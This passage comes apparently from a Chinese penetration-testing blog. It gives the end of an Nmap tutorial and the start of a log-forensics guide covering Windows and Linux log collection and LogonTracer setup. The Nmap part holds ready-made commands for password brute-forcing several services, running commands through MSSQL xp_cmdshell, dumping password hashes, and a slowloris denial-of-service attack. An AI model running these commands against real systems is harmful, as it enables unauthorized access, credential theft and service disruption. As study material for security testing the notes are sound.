scan(sT)：</h3><blockquote><p>如果不选择SYN扫描,TCP connect()扫描就是默认的扫描模式。不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect()。</p><p><strong>Tcp connect()扫描技术只适用于找出TCP和UDP端口.</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT IP</span><br></pre></td></tr></table></figure><h3 id="Udp-scan-sU-："><a href="#Udp-scan-sU-：" class="headerlink" title="Udp scan(sU)："></a>Udp scan(sU)：</h3><blockquote><p>这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。<br>UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap –sU IP</span><br></pre></td></tr></table></figure><h3 id="FIN-scan-sF-："><a href="#FIN-scan-sF-：" class="headerlink" title="FIN scan (sF)："></a>FIN scan (sF)：</h3><blockquote><p>有时候TcpSYN扫描不是最佳的扫描模式,因为有<strong>防火墙</strong>的存在.目标主机有时候可能有<strong>IDS和IPS系统</strong>的存在,<strong>防火墙会阻止掉SYN数据包</strong>。<br><strong>发送一个设置了FIN标志的数据包并不需要完成TCP的握手.FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).</strong></p></blockquote><blockquote><p>（不是很理解这里？）</p><p>几个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap –sF IP</span><br></pre></td></tr></table></figure><h3 id="PING-Scan-sP-："><a href="#PING-Scan-sP-：" class="headerlink" title="PING Scan (sP)："></a>PING Scan (sP)：</h3><blockquote><p>PING扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的。</p><p><strong>它不是用来发现是否开放端口的.PING扫描需要ROOT权限，</strong></p><p>如果用户没有ROOT权限,PING扫描将会使用connect()调用.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP IP</span><br></pre></td></tr></table></figure><h3 id="版本检测-sV-："><a href="#版本检测-sV-：" class="headerlink" title="版本检测(sV)："></a>版本检测(sV)：</h3><blockquote><p>版本检测是用来扫描目标主机和端口上运行的软件的版本。</p><p><strong>它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.。</strong></p><p><strong>使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口。</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV IP</span><br></pre></td></tr></table></figure><h3 id="Idle-scan-sL-："><a href="#Idle-scan-sL-：" class="headerlink" title="Idle scan (sL)："></a>Idle scan (sL)：</h3><p>Idle scan是一种先进的扫描技术，它<strong>不是用你真实的主机ip发送数据包</strong>，而是使用另外一个目标网络的主机发送数据包.<br>Idle scan是一种<strong>理想的匿名扫描技术</strong>,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口<br>有需要其它的扫描技术，如 FTP bounce（FTP反弹）, fragmentation scan（碎片扫描）, IP protocol scan（IP协议扫描）,以上讨论的是几种最主要的扫描方式.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sL IP</span><br></pre></td></tr></table></figure><h3 id="OS检测-O-："><a href="#OS检测-O-：" class="headerlink" title="OS检测(O)："></a>OS检测(O)：</h3><p>Nmap最重要的特点之一是能够远程检测操作系统和软件，Nmap的OS检测技术用来了解远程主机的操作系统和软件.<br>Nmap有一个名为nmap-OS-DB的数据库，该数据库包含超过2600操作系统的信息。<br>Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。<br>Nmap的首先发现开放的端口，然后发送数据包发现远程操作系统。操作系统检测参数是O（大写O）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -O IP</span><br></pre></td></tr></table></figure><h4 id="nmap操作系统指纹识别技术"><a href="#nmap操作系统指纹识别技术" class="headerlink" title="nmap操作系统指纹识别技术"></a>nmap操作系统指纹识别技术</h4><blockquote><ul><li>设备类型（路由器，工作组等）</li><li>运行（运行的操作系统）</li><li>操作系统的详细信息（操作系统的名称和版本）</li><li>网络距离（目标和攻击者之间的距离跳）</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -O-PN</span><br></pre></td></tr></table></figure><p>如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会阻止掉ping请求.-PN命令告诉Nmap不用ping远程主机。<br>以上命令告诉发信主机远程主机是存活在网络上的，所以没有必要发送ping请求,使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现.。<br>Nmap的操作系统检测的基础是有开放和关闭的端口，如果OSscan无法检测到至少一个开放或者关闭的端口，会返回以下错误，代码如下:</p><p><code>arning:OSScan results may be unreliable because we could not find at least 1 openand 1 closed port</code></p><p>OSScan的结果是不可靠的，因为没有发现至少一个开放或者关闭的端口，这种情况是非常不理想的，应该是远程主机做了针对操作系统检测的防范。<br>如果Nmap不能检测到远程操作系统类型，那么就没有必要使用-osscan_limit检测。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -O --osscan-guess</span><br></pre></td></tr></table></figure><p>想好通过Nmap准确的检测到远程操作系统是比较困难的，需要使用到Nmap的猜测功能选项,–osscan-guess猜测认为最接近目标的匹配操作系统类型。</p><h1 id="nmap脚本使用"><a href="#nmap脚本使用" class="headerlink" title="nmap脚本使用"></a>nmap脚本使用</h1><blockquote><p>Windows安装nmap的安装目录下面有一个script目录，里面有各种脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\Program Files\Nmap\scripts</span><br></pre></td></tr></table></figure><p>Linux亦是，</p></blockquote><h2 id="nmap按脚本分类扫描"><a href="#nmap按脚本分类扫描" class="headerlink" title="nmap按脚本分类扫描"></a>nmap按脚本分类扫描</h2><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--script=type</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth: 负责处理鉴权证书（绕开鉴权）的脚本  </span><br><span class="line">broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  </span><br><span class="line">brute: 提供暴力破解方式，针对常见的应用如http/snmp等  </span><br><span class="line">default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  </span><br><span class="line">discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  </span><br><span class="line">dos: 用于进行拒绝服务攻击  </span><br><span class="line">exploit: 利用已知的漏洞入侵系统  </span><br><span class="line">external: 利用第三方的数据库或资源，例如进行whois解析  </span><br><span class="line">fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</span><br><span class="line">intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  </span><br><span class="line">malware: 探测目标机是否感染了病毒、开启了后门等信息  </span><br><span class="line">safe: 此类与intrusive相反，属于安全性脚本  </span><br><span class="line">version: 负责增强服务与版本扫描（Version Detection）功能的脚本  </span><br><span class="line">vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</span><br></pre></td></tr></table></figure><ol><li>负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=auth 192.168.137.*</span><br></pre></td></tr></table></figure><ol start="2"><li>提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=brute 192.168.137.*</span><br></pre></td></tr></table></figure><ol start="3"><li>默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*</span><br></pre></td></tr></table></figure><ol start="4"><li>检查是否存在常见漏洞</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script=vuln 192.168.137.*</span><br></pre></td></tr></table></figure><ol start="5"><li>在局域网内探查更多服务开启状况</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -p445 --script=broadcast 192.168.137.4</span><br></pre></td></tr></table></figure><ol start="6"><li>利用第三方的数据库或资源，例如进行whois解析</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script external 202.103.243.110</span><br></pre></td></tr></table></figure><ol start="7"><li>识别waf</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap –p80,443 --script http-waf-detect ip</span><br><span class="line">nmap –p80,443 --script http-waf-fingerprint ip</span><br></pre></td></tr></table></figure><blockquote><p>可以看到有这些脚本都可以使用~~~~</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051900270.png" alt="image-20221005190021808" style="zoom:50%;" /><h2 id="nmap按应用服务扫描"><a href="#nmap按应用服务扫描" class="headerlink" title="nmap按应用服务扫描"></a>nmap按应用服务扫描</h2><h3 id="vnc扫描"><a href="#vnc扫描" class="headerlink" title="vnc扫描"></a>vnc扫描</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检查vnc bypass：</span></span><br><span class="line">nmap  --script=realvnc-auth-bypass 192.168.137.4</span><br><span class="line"><span class="comment">#检查vnc认证方式：</span></span><br><span class="line">nmap  --script=vnc-auth  192.168.137.4</span><br><span class="line"><span class="comment">#获取vnc信息：</span></span><br><span class="line">nmap  --script=vnc-info  192.168.137.4</span><br></pre></td></tr></table></figure><h3 id="smb扫描"><a href="#smb扫描" class="headerlink" title="smb扫描"></a>smb扫描</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#smb破解</span></span><br><span class="line">nmap  --script=smb-brute.nse 192.168.137.4</span><br><span class="line"><span class="comment">#smb字典破解</span></span><br><span class="line">nmap --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4</span><br><span class="line"><span class="comment">#smb已知几个严重漏</span></span><br><span class="line">nmap  --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4</span><br><span class="line"><span class="comment">#查看共享目录</span></span><br><span class="line">nmap -p 445  --script smb-ls --script-args ‘share=e$,path=\,smbuser=<span class="built_in">test</span>,smbpass=<span class="built_in">test</span>’ 192.168.137.4</span><br><span class="line"><span class="comment">#查询主机一些敏感信息（注：需要下载nmap_service）</span></span><br><span class="line">nmap -p 445 -n –script=smb-psexec --script-args= smbuser=<span class="built_in">test</span>,smbpass=<span class="built_in">test</span> 192.168.137.4</span><br><span class="line"><span class="comment">#查看会话</span></span><br><span class="line">nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=<span class="built_in">test</span>,smbpass=<span class="built_in">test</span> 192.168.137.4</span><br><span class="line"><span class="comment">#系统信息</span></span><br><span class="line">nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=<span class="built_in">test</span>,smbpass=<span class="built_in">test</span> 192.168.137.4</span><br></pre></td></tr></table></figure><h3 id="Mssql扫描："><a href="#Mssql扫描：" class="headerlink" title="Mssql扫描："></a>Mssql扫描：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#猜解mssql用户名和密码</span></span><br><span class="line">nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4</span><br><span class="line"><span class="comment">#xp_cmdshell 执行命令</span></span><br><span class="line">nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=<span class="string">&quot;net user&quot;</span> 192.168.137.4</span><br><span class="line"><span class="comment">#dumphash值</span></span><br><span class="line">nmap -p 1433 --script ms-sql-dump-hashes.nse --script-args mssql.username=sa,mssql.password=sa  192.168.137.4</span><br></pre></td></tr></table></figure><h3 id="Mysql扫描"><a href="#Mysql扫描" class="headerlink" title="Mysql扫描"></a>Mysql扫描</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#扫描root空口令</span></span><br><span class="line">nmap -p3306 --script=mysql-empty-password.nse 192.168.137.4</span><br><span class="line"><span class="comment">#列出所有mysql用户</span></span><br><span class="line">nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root 192.168.137.4</span><br><span class="line"><span class="comment">#支持同一应用的所有脚本扫描</span></span><br><span class="line">nmap --script=mysql-* 192.168.137.4</span><br></pre></td></tr></table></figure><h3 id="Oracle扫描"><a href="#Oracle扫描" class="headerlink" title="Oracle扫描"></a>Oracle扫描</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#oracle sid扫描</span></span><br><span class="line">nmap --script=oracle-sid-brute -p 1521-1560 192.168.137.5</span><br><span class="line"><span class="comment">#oracle弱口令破解</span></span><br><span class="line">nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.137.5</span><br></pre></td></tr></table></figure><h2 id="其他一些比较好用的脚本"><a href="#其他一些比较好用的脚本" class="headerlink" title="其他一些比较好用的脚本"></a>其他一些比较好用的脚本</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap --script=broadcast-netbios-master-browser 192.168.137.4   <span class="comment">#发现网关  </span></span><br><span class="line">nmap -p 873 --script rsync-brute --script-args <span class="string">&#x27;rsync-brute.module=www&#x27;</span> 192.168.137.4  <span class="comment">#破解rsync  </span></span><br><span class="line">nmap --script informix-brute -p 9088 192.168.137.4    <span class="comment">#informix数据库破解  </span></span><br><span class="line">nmap -p 5432 --script pgsql-brute 192.168.137.4       <span class="comment">#pgsql破解  </span></span><br><span class="line">nmap -sU --script snmp-brute 192.168.137.4            <span class="comment">#snmp破解  </span></span><br><span class="line">nmap -sV --script=telnet-brute 192.168.137.4          <span class="comment">#telnet破解</span></span><br><span class="line">nmap --script=http-vuln-cve2010-0738 --script-args <span class="string">&#x27;http-vuln-cve2010-0738.paths=&#123;/path1/,/path2/&#125;&#x27;</span> &lt;target&gt;  jboss autopwn</span><br><span class="line">nmap --script=http-methods.nse 192.168.137.4        <span class="comment">#检查http方法</span></span><br><span class="line">nmap --script http-slowloris --max-parallelism 400 192.168.137.4  <span class="comment">#dos攻击，对于处理能力较小的站点还挺好用的 &#x27;half-HTTP&#x27; connections</span></span><br><span class="line">nmap --script=samba-vuln-cve-2012-1182  -p 139 192.168.137.4</span><br></pre></td></tr></table></figure><blockquote><p>不靠谱的脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vnc-brute    次数多了会禁止连接</span><br><span class="line">pcanywhere-brute   同上</span><br></pre></td></tr></table></figure></blockquote><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><blockquote><ol><li><p>若不加端口说明扫描默认端口，<code>1-1024</code> + nmap-service</p></li><li><p>Nmap默认扫描只扫描1000个最可能开放的端口</p></li><li><p>有些时候，nmap会扫不出结果，可能是有防火墙或者其他安全设备，nmap提供绕过防火墙的功能，可以尝试绕过</p></li></ol></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://nmap.org/man/zh/">nmap参考指南（中文版）</a></li><li><a href="https://blog.csdn.net/qq_41880069/article/details/82792896">Nmap的使用方法总结</a></li><li><a href="https://blog.csdn.net/m1585761297/article/details/80015726?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-5.baidujs&dist_request_id=1331989.13183.16188260180781699&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-5.baidujs">Nmap简介和使用方法</a></li><li><a href="https://blog.csdn.net/benben0729/article/details/87916189?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.baidujs&dist_request_id=1331989.13476.16188267563089697&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.baidujs">nmap 扫描主机端口（谨慎使用）</a></li><li><a href="https://www.cnblogs.com/LyShark/p/10637507.html">Nmap命令-基础用法</a></li></ul></blockquote><h1 id="附：Nmap渗透测试思维导图"><a href="#附：Nmap渗透测试思维导图" class="headerlink" title="附：Nmap渗透测试思维导图"></a>附：Nmap渗透测试思维导图</h1><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209251325226.png" alt="Nmap渗透测试思维导图"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
          <category> 信息收集工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志审计</title>
      <link href="/%E8%93%9D%E9%98%9F/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1.html"/>
      <url>/%E8%93%9D%E9%98%9F/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>未完待续</p><h1 id="日志取证"><a href="#日志取证" class="headerlink" title="日志取证"></a>日志取证</h1><blockquote><p>僵木蠕类安全事件优先看系统日志（确定线索）</p></blockquote><h2 id="安全设备日志取证"><a href="#安全设备日志取证" class="headerlink" title="安全设备日志取证"></a>安全设备日志取证</h2><p>安全设备日志（确定线索）。 如果已获得关键线索（<strong>关键时间点、攻击手段、IP</strong>）的情况下，根据线索先分析安全设备日志，不论是否有线索都导出前 7 天-30 天时间全量的安全<br>设备日志（根据日志数据量大小，现场评估适当调整）用于同步分析，如<strong>僵木蠕类优先看终端防护日志</strong>、<strong>web 类优先查看流量监测防护日志</strong>；</p><h2 id="Windows-系统日志取证"><a href="#Windows-系统日志取证" class="headerlink" title="Windows 系统日志取证"></a>Windows 系统日志取证</h2><h3 id="Windows-系统日志位置："><a href="#Windows-系统日志位置：" class="headerlink" title="Windows 系统日志位置："></a>Windows 系统日志位置：</h3><blockquote><p>（<code>%SystemRoot%</code>即 <code>C:\Windows</code>）</p></blockquote><ul><li><code>Windows 2000 / Server2003 / Windows XP</code> ：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%SystemRoot%\System32\Winevt\Logs\*.evtx</span><br></pre></td></tr></table></figure><ul><li><code>Windows Vista / 7 / 10 / Server2008</code> 及 以 上 版本：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%SystemRoot%\System32\Config\*.evtx</span><br></pre></td></tr></table></figure><blockquote><p>我win10的日志在：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\winevt\Logs</span><br></pre></td></tr></table></figure></blockquote><h3 id="命令行复制所有系统日志："><a href="#命令行复制所有系统日志：" class="headerlink" title="命令行复制所有系统日志："></a>命令行复制所有系统日志：</h3><p>尝试用两种方式复制系统日志到当前目录的 Logs 文件中 ：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">xcopy <span class="string">&quot;%windir%\System32\config&quot;</span> <span class="string">&quot;Logs&quot;</span> /E /Y /F &amp; xcopy <span class="string">&quot;%windir%\System32\winevt\Logs&quot;</span> <span class="string">&quot;Logs&quot;</span> /E /Y /F</span><br></pre></td></tr></table></figure><blockquote><p>日志文件过大的情况，根据实际情况按照关键线索、重要程度挑选相关日志进行提取，一般 <code>System.evtx、Security.evtx、Application.evtx</code> 必取的。</p></blockquote><h3 id="Windows-系统获取日志的相关命令"><a href="#Windows-系统获取日志的相关命令" class="headerlink" title="Windows 系统获取日志的相关命令"></a>Windows 系统获取日志的相关命令</h3><p>命令：将 System 日志导出到文件 C:\System_log.evtx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil epl System C:\System_log.evtx </span><br></pre></td></tr></table></figure><p>命令： 导出远程桌面日志到某位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil epl Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational C:\rdp_log.evtx </span><br></pre></td></tr></table></figure><p>命令：在应用日志中的最后 100 个条目中搜索 ID 为 1704 的事件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil qe Application /q:&quot;Event/System/EventID=1704&quot; /c:100 /f:text </span><br></pre></td></tr></table></figure><p>命令：获取本地计算机上的所有日志，通常首先检索传统日志，然后检索新的 Windows 事件日志。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-WinEvent -listlog * </span><br></pre></td></tr></table></figure><p>命令：获取表示本地计算机上的传统系统日志的对象。该对象包括有关日志的有用信息，其中包括日志大小、事件日志提供程序、文件路径以及是否已启用日志。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-WinEvent -listlog Setup | format-list -property *</span><br></pre></td></tr></table></figure><p>命令：将所有日志按照时间顺序导出到 csv 中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fulleventlogview.exe /DataSource 1 /scomma c:/event.csv </span><br></pre></td></tr></table></figure><h2 id="Linux系统日志取证"><a href="#Linux系统日志取证" class="headerlink" title="Linux系统日志取证"></a>Linux系统日志取证</h2><h3 id="Linux-系统日志位置："><a href="#Linux-系统日志位置：" class="headerlink" title="Linux 系统日志位置："></a>Linux 系统日志位置：</h3><blockquote><p>系统日志的默认位置为：&#x2F;var&#x2F;log&#x2F;*.log</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令行打包压缩所有系统日志：压缩/var/log 文件到当前目录（执行命令的路径下）syslog.zip 文件中命令：</span></span><br><span class="line">zip -q -r syslog.zip /var/log</span><br></pre></td></tr></table></figure><blockquote><p>日志文件过大的情况，根据实际情况按照关键线索、重要程度挑选相关日志进行提取，一般必取的如：<br>&#x2F;var&#x2F;log&#x2F;cron<br>&#x2F;var&#x2F;log&#x2F;messages<br>&#x2F;var&#x2F;log&#x2F;secure<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;*(如果有)<br>&#x2F;var&#x2F;log&#x2F;apache&#x2F;*(如果有)<br>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;*(如果有)</p></blockquote><h2 id="web-服务日志取证"><a href="#web-服务日志取证" class="headerlink" title="web 服务日志取证"></a>web 服务日志取证</h2><p>Web 类安全事件优先查看 web 日志，提取相关日志用于分析，最终是为了确定的相关线索。<br>Web 类日志取证的目标为获取关键 Web 应用以及启用的旁站 web 应用。在取 web日志之前，优先确认服务器在安全事件发生时启用了哪些 Web 应用，利用已确认 web 应用尝试分析攻击面。接下来灵活采取合适的 web 日志定位方式，获取到相关 web 日志，完成 web 日志取证工作即可。<br>web 日志的位置一般各有不同，通常 windows 的 IIS、linux 下中间件类的日志（如apache、tomcat、nginx）都有默认的日志存放位置，一些自带容器类的 web 服务（如 jboss、weblogic）其日志文件默认都存放在应用的安装目录中。</p><h1 id="Windows日志审计"><a href="#Windows日志审计" class="headerlink" title="Windows日志审计"></a>Windows日志审计</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#进入图形化界面查看日志</span></span><br><span class="line">eventvwr.msc</span><br></pre></td></tr></table></figure><h2 id="常见事件ID"><a href="#常见事件ID" class="headerlink" title="常见事件ID"></a>常见事件ID</h2><h2 id="Windows-日志审计工具"><a href="#Windows-日志审计工具" class="headerlink" title="Windows 日志审计工具"></a>Windows 日志审计工具</h2><h3 id="LogFusion（巨香）"><a href="#LogFusion（巨香）" class="headerlink" title="LogFusion（巨香）"></a>LogFusion（巨香）</h3><blockquote><p>小迪老师推荐，很好用</p><p><a href="https://www.xzji.com/news/4806.html">LogFusion Pro系统日志监控软件安装激活教程</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows-LogFusion 载入查看：</span><br><span class="line">事件归类，事件 ID，事件状态等</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210210603399.png" alt="image-20221021060255440"></p><h3 id="LogParser"><a href="#LogParser" class="headerlink" title="LogParser"></a>LogParser</h3><blockquote><p>微软官方</p></blockquote><h3 id="win日志自动化分析神器-LogonTracer"><a href="#win日志自动化分析神器-LogonTracer" class="headerlink" title="win日志自动化分析神器 - LogonTracer"></a>win日志自动化分析神器 - LogonTracer</h3><blockquote><p>win日志自动化分析神器 - LogonTracer - 外网内网日志</p><p>下载地址：<a href="https://github.com/JPCERTCC/LogonTracer">https://github.com/JPCERTCC/LogonTracer</a></p></blockquote><h4 id="docker安装（推荐）"><a href="#docker安装（推荐）" class="headerlink" title="docker安装（推荐）"></a>docker安装（推荐）</h4><blockquote><p><a href="https://github.com/JPCERTCC/LogonTracer/wiki/jump-start-with-docker">Jump start with Docker · JPCERTCC&#x2F;LogonTracer Wiki · GitHub</a></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull jpcertcc/docker-logontracer</span><br><span class="line">docker run \</span><br><span class="line">   --detach \</span><br><span class="line">   --publish=7474:7474 --publish=7687:7687 --publish=8080:8080 \</span><br><span class="line">   -e LTHOSTNAME=124.223.217.243 \</span><br><span class="line">   jpcertcc/docker-logontracer</span><br></pre></td></tr></table></figure><blockquote><p>访问<a href="http://124.223.217.243:8080/">http://124.223.217.243:8080</a></p></blockquote><h3 id="Sysmon"><a href="#Sysmon" class="headerlink" title="Sysmon"></a>Sysmon</h3><blockquote><p>Windows <code>Sysinternals</code>出品的一款Sysinternals系列中的工具。它以系统服务和设备驱动程序的方法安装在系统上，并保持常驻性。用来监视和记录系统活动，并记录到windows事件日志，可以提供有关进程创建，网络链接和文件创建时间更改的详细信息</p><p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</a></p></blockquote><h4 id="手动安装比较麻烦"><a href="#手动安装比较麻烦" class="headerlink" title="手动安装比较麻烦"></a>手动安装比较麻烦</h4><p>1、下载并解压neo4j </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/neo4j/neo4j</span><br><span class="line">tar -zvxf neo4j-community-4.2.1-unix.tar</span><br></pre></td></tr></table></figure><p>2、安装java11环境</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install java-11-openjdk -y</span><br></pre></td></tr></table></figure><p>3、修改neo4j配置保证外部访问</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dbms.connector.bolt.listen_address=0.0.0.0:7687</span><br></pre></td></tr></table></figure><p>4、开启neo4j</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/</span><br><span class="line">ls</span><br><span class="line">cd neo4j-community-4.2.1/</span><br><span class="line">ls</span><br><span class="line">./bin/neo4j console &amp;</span><br></pre></td></tr></table></figure><p>5、下载Logontracer并安装库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/JPCERTCC/LogonTracer.git </span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><p>6、启动Logontracer并导入日志分析文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 logontracer.py -r -o [PORT] -u [USERNAME] -p [PASSWORD] -s [IP 地址] </span><br><span class="line">python3 logontracer.py -r -o 8080 -u neo4j -p xiaodi -s 47.98.99.126 </span><br></pre></td></tr></table></figure><p>手动导入日志文件（当然也可以用图形化界面upload日志文件）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 logontracer.py -e [EVTX 文件] -z [时区] -u [用户名] -p [密码] -s [IP 地址] </span><br><span class="line">python3 logontracer.py -e Security.evtx -z -13 -u neo4j -p xiaodi -s 127.0.0.1</span><br></pre></td></tr></table></figure><p>7、刷新访问LogonTracer-web_gui，查看分析结果</p><h1 id="Linux日志审计"><a href="#Linux日志审计" class="headerlink" title="Linux日志审计"></a>Linux日志审计</h1><h2 id="查看日志的命令"><a href="#查看日志的命令" class="headerlink" title="查看日志的命令"></a>查看日志的命令</h2><h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>这个是我最常用的一种查看方式</p><blockquote><p><a href="https://blog.csdn.net/weixin_44019406/article/details/102805197">https://blog.csdn.net/weixin_44019406/article/details/102805197</a></p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令格式: tail[必要参数][选择参数][文件]</span></span><br><span class="line">-f 循环读取</span><br><span class="line">-q 不显示处理信息</span><br><span class="line">-v 显示详细的处理信息</span><br><span class="line">-c&lt;数目&gt; 显示的字节数</span><br><span class="line">-n&lt;行数&gt; 显示行数</span><br><span class="line">-q, --quiet, --silent 从不输出给出文件名的首部</span><br><span class="line">-s, --sleep-interval=S 与-f合用,表示在每次反复的间隔休眠S秒</span><br></pre></td></tr></table></figure><p>用法如下：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span 